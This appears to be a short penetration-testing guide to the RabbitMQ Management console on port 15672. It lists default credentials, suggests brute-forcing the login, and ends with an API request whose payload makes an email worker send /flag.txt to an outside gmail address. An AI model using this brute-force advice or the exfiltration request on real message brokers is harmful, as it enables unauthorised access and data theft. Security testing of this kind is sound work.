# RabbitMQ Management - 15672

## RabbitMQ Information

In 5671,5672 - AMQP,  you can learn more about RabbitMQ. If the management plugin is active, the RabbitMQ Management web console may be found in this port.

## Enumeration

The default credentials for RabbitMQ are "guest":"guest". If they aren't working you may try to brute-force the login.

To manually start this module you can execute the following commands:

```bash
rabbitmq-plugins enable rabbitmq_management
service rabbitmq-server restart
```

If you have valid credentials you may find interesting the information of the API:

`http://domain:15672/api/connections`

It's possible to publish data inside a queue using the API of this service with a request like:

```http
POST /api/exchanges/%2F/amq.default/publish HTTP/1.1
Host: 172.32.46.72:15672
Authorization: Basic dGVzdDp0ZXN0
Accept: */*
Content-Type: application/json;charset=UTF-8
Content-Length: 267
​
{"vhost":"/","name":"amq.default","properties":{"delivery_mode":1,"headers":{}},"routing_key":"email","delivery_mode":"1","payload":"{\"to\":\"zevtnax+ppp@gmail.com\", \"attachments\": [{\"path\": \"/flag.txt\"}]}","headers":{},"props":{},"payload_encoding":"string"}
```

